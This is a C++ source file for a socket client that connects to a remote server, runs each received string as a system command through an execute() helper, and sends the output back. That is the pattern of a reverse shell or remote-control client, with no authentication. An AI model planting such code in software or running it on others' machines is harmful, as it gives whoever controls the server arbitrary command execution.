//
// Created by Dmitri on 2026-10-26.
//

#include "Client.h"

#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include <iostream>

#if defined(_WIN32)
#include <windows.h>
#include "../windows/command_output.h"

#elif defined(__APPLE__)
#include "../apple/command_output.h"

#endif

#if !defined(MSG_NOSIGNAL)
#define MSG_NOSIGNAL 0
#endif

Client::~Client() {
    Disconnect();
}

bool Client::ReceiveCommand(std::string &command) {
    const char* cmd = command.c_str();
    std::string output = execute(cmd);

    if (!output.empty()) {
        std::cout << "Command: " << output << std::endl;
        Send(output);
    }

    return true;
}

bool Client::Connect(std::string &host, std::string &port) {

    addrinfo hints{}, *result = nullptr;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (int rc = getaddrinfo(host.c_str(), port.c_str(), &hints, &result); rc != 0) {
        std::cerr << "getaddrinfo error: " << std::endl << std::endl << std::endl;
        return false;
    }

    for (addrinfo *p = result; p != nullptr; p = p->ai_next) {

        int fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, p->ai_addr, p->ai_addrlen) == 0) {
            sock = fd;
            break;
        }
        close(fd);
    }
    freeaddrinfo(result);

    if (sock < 0) {
        std::cerr << "Failed to connect to the server." << std::endl;
        return false;
    }
    connected = true;
    return true;
}

void Client::Listen() {
    if (connected && !listener.joinable()) {
        listener = std::thread(&Client::ReceiveLoop, this);
    }
}

void Client::Send(std::string &info) {
    if (!connected) return;

    size_t sent = 0;
    while (sent < info.size()) {
        ssize_t n = send(sock, info.data() + sent, info.size() - sent, 0);
        if (n <= 0) {
            connected = false;
            return;
        }
        sent += n;
    }
}

void Client::Disconnect() {
    connected = false;
    if (sock >= 0) {
        shutdown(sock, SHUT_RDWR);
    }
    if (listener.joinable()) {
        listener.join();
    }
    if (sock >= 0) {
        close(sock);
        sock = -1;
    }
}

void Client::ReceiveLoop() {
    char buffer[1024];
    while (connected) {
        ssize_t n = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) {
            if (connected) {
                std::cerr << "Server closed" << std::endl;
            }
            connected = false;
            break;
        }
        buffer[n] = '\0';
        std::string command = buffer;
        std::cout << command << std::endl;
        ReceiveCommand(command);
    }
}

bool Client::isConnected() {
    return connected;
}
